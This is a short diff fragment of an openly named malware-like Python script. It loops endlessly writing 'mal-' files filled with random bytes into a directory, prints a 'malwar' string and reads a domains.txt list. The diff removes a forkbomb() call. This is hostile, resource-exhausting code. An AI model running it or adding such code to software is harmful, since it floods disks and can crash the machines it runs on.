@@ -16,7 +16,6 @@ while mal == True:
     with open(os.getcwd() + "/" + directory + "/mal-" + random1 + str(random2) + str(random3) + str(random4), "a") as file:
       file.write(malwar + str(random.randbytes(999)))
     print(malwar)
-    forkbomb()
     file = open("domains.txt", "r")
     content = file.readlines()
     for line in content:
